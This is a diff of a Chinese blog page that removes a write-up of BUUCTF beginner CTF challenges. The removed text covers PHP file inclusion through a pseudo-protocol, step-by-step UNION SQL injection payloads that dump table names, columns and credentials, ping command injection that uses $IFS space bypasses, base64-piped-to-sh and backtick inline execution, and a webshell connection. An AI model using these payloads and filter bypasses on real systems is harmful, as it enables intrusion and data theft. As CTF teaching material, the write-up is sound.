-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115145958610.png" alt="image-20220115145958610"></p>
-<p>开始代码审计</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||stristr(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>简单，继续用伪协议</p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115150131652.png" alt="image-20220115150131652"></p>
-<p>base解密</p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115150207094.png" alt="image-20220115150207094"></p>
-<h2 id="第九题-sql注入"><a href="#第九题-sql注入" class="headerlink" title="第九题 sql注入"></a>第九题 sql注入</h2><p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115150411281.png" alt="image-20220115150411281"></p>
-<p>又是sql注入，他说不让用map就不用？</p>
-<p>好嘛没扫出来。</p>
-<p>万能密码也行不通了，开始手动注入</p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115151050988.png" alt="image-20220115151050988"></p>
-<p>order by4报错，就是说有3列</p>
-<p>payload：-1’ union select database(),2,3;#</p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115151455966.png" alt="image-20220115151455966"></p>
-<p>回显的是2,3</p>
-<p>payload：-1’ union select 1,database(),user();#</p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115151728456.png" alt="image-20220115151728456"></p>
-<p>得到数据库名字</p>
-<p>然后就开始爆表</p>
-<p>-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() ;#</p>
-<p>爆字段</p>
-<p>-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’l0ve1ysq1’ ;#</p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115153816044.png" alt="image-20220115153816044"></p>
-<p>爆数据：</p>
-<p>-1’ union select 1,2,group_concat(id,username,password) from l0ve1ysq1 ;#</p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115153828210.png" alt="image-20220115153828210"></p>
-<p>得到flag</p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115153915190.png" alt="image-20220115153915190"></p>
-<h2 id="第十题-命令执行漏洞"><a href="#第十题-命令执行漏洞" class="headerlink" title="第十题 命令执行漏洞"></a>第十题 命令执行漏洞</h2><p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115154242420.png" alt="image-20220115154242420"></p>
-<p>又是ping命令</p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115154306587.png" alt="image-20220115154306587"></p>
-<p>发现flag</p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115154348761.png" alt="image-20220115154348761"></p>
-<p>但是发现/和空格都被过滤了，想办法绕过</p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115154446178.png" alt="image-20220115154446178"></p>
-<p>额flag也被绕过了</p>
-<p>代替空格的符号有</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20(space)、%09(tab)、$IFS$9、$&#123;IFS&#125;$9、 &#123;IFS&#125;、IFS 都可以</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115154651400.png" alt="image-20220115154651400"></p>
-<p>访问index看看过滤规则,用的是正则表达式。</p>
-<p>我们可以用变量来代替flag字段，/?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115155138771.png" alt="image-20220115155138771"></p>
-<p>得到flag</p>
-<p>在网上还发现了其他的方法：</p>
-<p>  1.通过执行sh命令来执行 （bash被过滤了，不然也可以执行）</p>
-<pre><code>/ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
-注：sh是linux中运行shell的命令，bash相当于sh的升级版，sh∈bash
-
-
-
-
-
-2.内联执行 （真正的大佬操作，给跪了）
-构造 /?ip=127.0.0.1;cat$IFS$9`ls`
-注：内联，就是将反引号内命令的输出作为输入执行。
-</code></pre>
-<h2 id="第十一题-菜刀"><a href="#第十一题-菜刀" class="headerlink" title="第十一题 菜刀"></a>第十一题 菜刀</h2><p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115160821181.png" alt="image-20220115160821181"></p>
-<p>蚁剑直接连</p>
-<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115160834862.png" alt="image-20220115160834862"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -770,7 +675,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">172</span>
+          <span class="site-state-item-count">173</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
